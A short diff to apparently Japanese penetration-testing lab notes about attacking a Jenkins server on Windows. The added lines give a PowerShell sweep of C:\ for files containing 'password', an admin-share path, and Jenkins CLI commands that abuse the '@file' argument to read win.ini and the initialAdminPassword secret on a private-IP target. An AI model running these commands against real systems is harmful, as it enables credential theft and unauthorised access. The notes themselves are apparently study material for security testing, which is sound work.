@@ -640,6 +640,15 @@ jenkinsのweb uiにログインできないか再度試行
 jenkinsのconfigに直接はアクセスできないか
 `C:\Windows\System32\config\systemprofile\AppData\Local\Jenkins\.jenkins\secrets\initialAdminPassword`にアクセスできないか
 
+`# Cドライブ全体から "password" という文字列を含むファイルを再帰的に検索
+Get-ChildItem -Path C:\ -Include *.ps1,*.xml,*.txt,*.config,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"`
+
+`\\172.16.104.202\C$\Users\xxx`
+
+`java -jar jenkins-cli.jar -s http://<targetIP>:8080/ -http help "@C:\Windows\win.ini"`
+⇨もしアクセスできたら、`java -jar jenkins-cli.jar -s http://172.16.104.202:8080/ -http help "@C:\Windows\System32\config\systemprofile\AppData\Local\Jenkins\.jenkins\secrets\initialAdminPassword"`
+
+
 
 ## WinPEAS結果の見方
 
